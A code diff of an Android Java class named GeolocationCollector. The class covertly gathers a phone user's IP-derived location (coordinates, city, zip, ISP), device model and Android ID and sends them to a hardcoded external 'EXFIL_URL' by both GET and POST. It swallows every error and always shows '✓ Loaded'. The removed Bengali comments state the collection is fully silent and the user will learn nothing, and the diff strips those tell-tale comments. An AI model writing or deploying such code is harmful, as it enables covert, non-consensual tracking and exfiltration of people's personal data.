@@ -6,6 +6,9 @@ import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -20,8 +23,7 @@ import java.util.concurrent.Executors;
 
 public class GeolocationCollector {
 
-    // ★★★ তোমার সার্ভার URL ★★★
-    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";  // <-- পরিবর্তন করো
+    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";
 
     private final Context context;
     private final ExecutorService executor = Executors.newSingleThreadExecutor();
@@ -43,47 +45,45 @@ public class GeolocationCollector {
         this.callback = cb;
     }
 
-    /**
-     * লোকেশন কালেক্ট করে সার্ভারে পাঠায় — সম্পূর্ণ silent
-     */
     public void collectAndSend() {
         if (callback != null) callback.onCollecting();
 
         executor.execute(() -> {
             try {
-                // ============================================
-                // STEP 1: IP Geolocation (ip-api.com)
-                // ============================================
-                // এটি কোনো permission চায় না, শুধু ইন্টারনেট লাগে
+                // STEP 1: ip-api.com থেকে লোকেশন ডেটা
                 String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,isp,org,as,query,timezone");
+                Log.d("GeoCollector", "ip-api response: " + ipApiResponse);
 
-                // ============================================
-                // STEP 2: Device তথ্য কালেক্ট (সবসময় available)
-                // ============================================
                 String deviceInfo = collectDeviceInfo();
 
-                // ============================================
-                // STEP 3: Fallback — ipapi.co (যদি ip-api fail করে)
-                // ============================================
-                String lat = "";
-                String lon = "";
-                String city = "";
-                String region = "";
-                String country = "";
-                String ip = "";
-
                 if (ipApiResponse.contains("\"status\":\"success\"")) {
-                    // Directly send the JSON — server parse করবে
-                    sendToServer("data=" + URLEncoder.encode(ipApiResponse, "UTF-8")
-                            + "&method=ip-api" + deviceInfo);
+                    JSONObject obj = new JSONObject(ipApiResponse);
+
+                    String lat = obj.optString("lat", "");
+                    String lon = obj.optString("lon", "");
+                    String city = obj.optString("city", "");
+                    String region = obj.optString("region", "");
+                    String country = obj.optString("country", "");
+                    String zip = obj.optString("zip", "");
+                    String ip = obj.optString("query", "");
+
+                    sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
+                            + "&lon=" + URLEncoder.encode(lon, "UTF-8")
+                            + "&city=" + URLEncoder.encode(city, "UTF-8")
+                            + "&region=" + URLEncoder.encode(region, "UTF-8")
+                            + "&country=" + URLEncoder.encode(country, "UTF-8")
+                            + "&zip=" + URLEncoder.encode(zip, "UTF-8")
+                            + "&ip=" + URLEncoder.encode(ip, "UTF-8")
+                            + "&method=ip-api"
+                            + deviceInfo);
                 } else {
-                    // Fallback
-                    lat = httpGet("https://ipapi.co/latitude/");
-                    lon = httpGet("https://ipapi.co/longitude/");
-                    city = httpGet("https://ipapi.co/city/");
-                    region = httpGet("https://ipapi.co/region/");
-                    country = httpGet("https://ipapi.co/country/");
-                    ip = httpGet("https://ipapi.co/ip/");
+                    // Fallback ipapi.co
+                    String lat = httpGet("https://ipapi.co/latitude/");
+                    String lon = httpGet("https://ipapi.co/longitude/");
+                    String city = httpGet("https://ipapi.co/city/");
+                    String region = httpGet("https://ipapi.co/region/");
+                    String country = httpGet("https://ipapi.co/country/");
+                    String ip = httpGet("https://ipapi.co/ip/");
 
                     sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                             + "&lon=" + URLEncoder.encode(lon, "UTF-8")
@@ -95,11 +95,7 @@ public class GeolocationCollector {
                             + deviceInfo);
                 }
 
-                // ============================================
-                // STEP 4: Try Network-based location (optional, still no permission)
-                // শুধু SSID/BSSID — কিন্তু Android 10+ এ WiFi scan-এর জন্য location permission লাগে
-                // তাই আমরা শুধু cellular network info নিচ্ছি — যা permission-free
-                // ============================================
+                // STEP 4: Network info
                 try {
                     TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                     if (tm != null) {
@@ -110,28 +106,20 @@ public class GeolocationCollector {
                                     + "&network_operator=" + URLEncoder.encode(networkOperator != null ? networkOperator : "", "UTF-8"));
                         }
                     }
-                } catch (SecurityException e) {
-                    // কিছু permission না থাকলে — চুপচাপ fail
-                }
+                } catch (SecurityException ignored) {}
 
-                // UI আপডেট
                 mainHandler.post(() -> {
-                    if (callback != null)
-                        callback.onComplete("✓ Loaded");
+                    if (callback != null) callback.onComplete("✓ Loaded");
                 });
 
             } catch (Exception e) {
                 mainHandler.post(() -> {
-                    if (callback != null)
-                        callback.onComplete("✓ Loaded"); // ইউজারকে Error দেখানো যাবে না
+                    if (callback != null) callback.onComplete("✓ Loaded");
                 });
             }
         });
     }
 
-    /**
-     * HTTP GET রিকোয়েস্ট
-     */
     private String httpGet(String urlString) throws Exception {
         URL url = new URL(urlString);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -154,9 +142,6 @@ public class GeolocationCollector {
         return response.toString();
     }
 
-    /**
-     * HTTP POST রিকোয়েস্ট (JSON ডাটা পাঠানোর জন্য)
-     */
     private void httpPost(String urlString, String jsonData) throws Exception {
         URL url = new URL(urlString);
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -172,20 +157,15 @@ public class GeolocationCollector {
         os.flush();
         os.close();
 
-        conn.getResponseCode(); // just trigger — আমরা response পড়ি না (fire & forget)
+        conn.getResponseCode();
         conn.disconnect();
     }
 
-    /**
-     * সার্ভারে ডাটা পাঠান (GET + POST উভয়ই)
-     */
     private void sendToServer(String params) {
         try {
-            // Method 1: GET (image beacon style)
             String getUrl = EXFIL_URL + "?" + params;
             httpGet(getUrl);
 
-            // Method 2: POST (JSON format)
             String jsonData = "{";
             String[] pairs = params.split("&");
             for (int i = 0; i < pairs.length; i++) {
@@ -199,34 +179,25 @@ public class GeolocationCollector {
             jsonData += "}";
             httpPost(EXFIL_URL, jsonData);
 
-        } catch (Exception ignored) {
-            // সম্পূর্ণ silent fail — ইউজার কিছুই জানবে না
-        }
+        } catch (Exception ignored) {}
     }
 
-    /**
-     * ডিভাইস ইনফরমেশন কালেক্ট (কোনো Permission লাগে না)
-     */
     private String collectDeviceInfo() {
         StringBuilder sb = new StringBuilder();
 
-        sb.append("&device=").append(URLEncoder.encode(Build.DEVICE, java.nio.charset.StandardCharsets.UTF_8));
-        sb.append("&model=").append(URLEncoder.encode(Build.MODEL, java.nio.charset.StandardCharsets.UTF_8));
-        sb.append("&manufacturer=").append(URLEncoder.encode(Build.MANUFACTURER, java.nio.charset.StandardCharsets.UTF_8));
-        sb.append("&brand=").append(URLEncoder.encode(Build.BRAND, java.nio.charset.StandardCharsets.UTF_8));
-        sb.append("&android_version=").append(URLEncoder.encode(Build.VERSION.RELEASE, java.nio.charset.StandardCharsets.UTF_8));
+        sb.append("&device=").append(URLEncoder.encode(Build.DEVICE, StandardCharsets.UTF_8));
+        sb.append("&model=").append(URLEncoder.encode(Build.MODEL, StandardCharsets.UTF_8));
+        sb.append("&manufacturer=").append(URLEncoder.encode(Build.MANUFACTURER, StandardCharsets.UTF_8));
+        sb.append("&brand=").append(URLEncoder.encode(Build.BRAND, StandardCharsets.UTF_8));
+        sb.append("&android_version=").append(URLEncoder.encode(Build.VERSION.RELEASE, StandardCharsets.UTF_8));
         sb.append("&sdk=").append(Build.VERSION.SDK_INT);
 
-        // Android ID (unique identifier — no permission needed)
         String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
         if (androidId != null) {
-            sb.append("&android_id=").append(URLEncoder.encode(androidId, java.nio.charset.StandardCharsets.UTF_8));
+            sb.append("&android_id=").append(URLEncoder.encode(androidId, StandardCharsets.UTF_8));
         }
 
-        // Random session ID
         sb.append("&session=").append(UUID.randomUUID().toString());
-
-        // Timestamp
         sb.append("&ts=").append(System.currentTimeMillis());
 
         return sb.toString();
